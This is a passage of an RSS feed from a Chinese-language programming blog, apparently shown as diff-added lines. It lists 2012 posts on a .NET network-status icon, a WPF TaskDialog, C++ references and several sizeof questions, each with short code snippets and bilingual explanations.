+      <guid>https://leizhiyuan.github.io/2012/09/24/.net%E6%98%BE%E7%A4%BA%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E7%8A%B6%E6%80%81%E5%9B%BE%E6%A0%87/</guid>
+      <description>效果图： 
+介绍 　越来越多的软件要通过连接互联网来执行一些业务层的业务操作，比如调用web services服务，获取数据等等。 通常你可能希望知道当前你的网络连接是不是真的连上了，当然有很多种方法可以做到，比如，你可以查看System.Net 命名空间中的NetworkInterface 的状态，但是有这以太网连接并不表示你的连接真的可以用。 本文将会展示一种方法，该方法在程序的状态栏StatusStrip 显示一个简单的图标来指示是不是真的连接到了互联网。
+使用代码 　最简单的我们会想到使用一个Timer来进行http-get请求来判断一个特定的网页是否可用。
+　当然这种方法下，我们最应该考虑的就是请求不能阻塞UI线程，因此，我将使用一个BackgroundWorker 对象来进行get请求，BackgroundWorker 对象声明了DoWork方法。该方法定义了一个事件句柄，该句柄传递一个DoWorkEventArgs 类来将事件的处理结果返回到UI线程，因此，你不必与任何的UI元素进行交互，因为它运行在一个独立的线程里。
+private void InitializeComponent() { // Background Worker this._worker = new BackgroundWorker(); this._worker.WorkerReportsProgress = false; this._worker.WorkerSupportsCancellation = false; this._worker.DoWork += new DoWorkEventHandler(this.BackgroundWorker_DoWork); this._worker.RunWorkerCompleted += new RunWorkerCompletedEventHandler(this.BackgroundWorker_RunWorkerCompleted); // Timer this._updateTimer = new Timer(); this._updateTimer.Enabled = !this.DesignMode; // Enabled when not in design mode this._updateTimer.Tick += delegate { this.OnTick(); }; } private void OnTick() { if (this.</description>
+    </item>
+    
+    <item>
+      <title>一个可定制的WPF任务对话框</title>
+      <link>https://leizhiyuan.github.io/2012/09/24/%E4%B8%80%E4%B8%AA%E5%8F%AF%E5%AE%9A%E5%88%B6%E7%9A%84wpf%E4%BB%BB%E5%8A%A1%E5%AF%B9%E8%AF%9D%E6%A1%86/</link>
+      <pubDate>Mon, 24 Sep 2012 08:03:17 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/09/24/%E4%B8%80%E4%B8%AA%E5%8F%AF%E5%AE%9A%E5%88%B6%E7%9A%84wpf%E4%BB%BB%E5%8A%A1%E5%AF%B9%E8%AF%9D%E6%A1%86/</guid>
+      <description>今天实在看WPF揭秘的时候看到TaskDialog这个控件的。然后就去找了一下开源的代码。在codeproject上发现了这个，非常给力。。另外codeproject改版后很漂亮哦。 
+介绍： 这是用WPF实现Vista上TaskDialog效果的代码。
+Messagbox消息框 通过调用重写的静态Show方法。TaskDialog就会表现的像一个Messagebox。他有四个文本类型的属性：Header（头部）, Content（内容）, Detail（更多）, 和 Footer（底部），其实Detail是一个折叠的区域， 而Header和Footer还有一个icon属性（HeaderIcon和FooterIcon），除此之外，Header还有Background（背景）和Foreground（前景）属性
+// TaskDialog.Show方法签名 public static TaskDialogResult Show( string title, string header, string content, string detail, string footer, TaskDialogButton button, TaskDialogResult defaultResult, TaskDialogIcon headerIcon, TaskDialogIcon footerIcon, Brush headerBackground, Brush headerForeground) // TaskDialog.Show 方法的一个例子 TaskDialog.Show(&#34;Task Dialog 测试&#34;, &#34;消息框的标题文字&#34;, &#34;消息框的内容部分. &#34; + &#34; 可以自适应内容.&#34;, &#34;消息框的细节部分 &#34; + &#34;可以自适应内容&#34;, &#34;消息框的底部.&#34;, TaskDialogButton.Ok, TaskDialogResult.None, TaskDialogIcon.Information, TaskDialogIcon.Shield, Brushes.White, Brushes.Navy); 定制TaskDialog 使用静态的Show方法。Header, Content, Detail, 和Footer 就限制了只能传递字符串作为值了。 为了定义这个对话框，你先创建TaskDialog类的一个对象，然后分别设置一下各个属性，最后调用Show方法就可以了</description>
+    </item>
+    
+    <item>
+      <title>C&#43;&#43; 独立引用，为什么？</title>
+      <link>https://leizhiyuan.github.io/2012/05/23/c---%E7%8B%AC%E7%AB%8B%E5%BC%95%E7%94%A8%E4%B8%BA%E4%BB%80%E4%B9%88/</link>
+      <pubDate>Wed, 23 May 2012 07:25:04 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/05/23/c---%E7%8B%AC%E7%AB%8B%E5%BC%95%E7%94%A8%E4%B8%BA%E4%BB%80%E4%B9%88/</guid>
+      <description>问题：
+I read in some good C++ tutorial that independent references do exist, and act like aliasing. 我读了一些好的C++文章，发现独立引用确实存在，并且很像别名。 But&amp;hellip; I wonder what it is made for. 但是，，，我想知道他适用于什么情况。 Why should one want to use aliasing.Besides, some piece of code that is not clear to me: 为什么有人想使用别名呢，另外，下面这段代码我不太清楚。 int a; int &amp;amp;ref = a; // independent reference int b = 19; ref = b; cout &amp;lt;&amp;lt; a &amp;lt;&amp;lt; &amp;ldquo; &amp;rdquo; &amp;lt;&amp;lt; ref &amp;lt;&amp;lt; &amp;ldquo;\n&amp;rdquo;; ref&amp;ndash;; cout &amp;lt;&amp;lt; a &amp;lt;&amp;lt; &amp;ldquo; &amp;rdquo; &amp;lt;&amp;lt; ref &amp;lt;&amp;lt; &amp;ldquo;\n&amp;rdquo;;</description>
+    </item>
+    
+    <item>
+      <title>c &amp; c&#43;&#43;中sizeof返回值不同?</title>
+      <link>https://leizhiyuan.github.io/2012/05/22/c--c--%E4%B8%ADsizeof%E8%BF%94%E5%9B%9E%E5%80%BC%E4%B8%8D%E5%90%8C/</link>
+      <pubDate>Tue, 22 May 2012 11:28:27 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/05/22/c--c--%E4%B8%ADsizeof%E8%BF%94%E5%9B%9E%E5%80%BC%E4%B8%8D%E5%90%8C/</guid>
+      <description>问题: A character array is defined globally and a structure with same name is defined within a function. 一个字符数组被定义为全局变量，一个相同名字的结构体被定义在一个函数内部。
+Why sizeof operator returns different values for c &amp;amp; c++ ? 为什么sizeof操作符对于C和C++返回了不同的值呢？ char S[13]; void fun() { struct S { int v; }; int v1 = sizeof(S); } // returns 4 in C++ and 13 in C 答案： Because in C++, the struct you defined is named S, while in C, 因为在C++中，你定义的结构体的名称是S，而在C中，</description>
+    </item>
+    
+    <item>
+      <title>为什么sizeof(str.substr(0,3).c_str())=8?</title>
+      <link>https://leizhiyuan.github.io/2012/05/21/%E4%B8%BA%E4%BB%80%E4%B9%88sizeofstr.substr03.c_str8/</link>
+      <pubDate>Mon, 21 May 2012 06:59:09 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/05/21/%E4%B8%BA%E4%BB%80%E4%B9%88sizeofstr.substr03.c_str8/</guid>
+      <description>问题： string str = &amp;quot;abcdefgdcb&amp;quot;; cout &amp;amp;lt; &amp;amp;lt; sizeof(str.substr(0,3).c_str()); For some reason, the above string is giving me 8. I assumed c_str() returns a null string, 由于某些原因，上面的这个字符串得到的结果是8，我估计c_str()返回了一个null，
+and sizeof uses the null to determine the size of the string. 并且sizeof函数使用这个null来定义这个字符串的大小。
+答案： Because sizeof doesn&amp;rsquo;t give you the length of a string, 因为sizeof给你的不是一个字符串的长度，
+it gives you the size of the type (const char * in this case). Try strlen. 他给你的是这个类型的大小（这种情况下的类型是c_str()返回的const char*类型），想要得到正确的结果，试试strlen函数吧。</description>
+    </item>
+    
+  </channel>
+</rss>
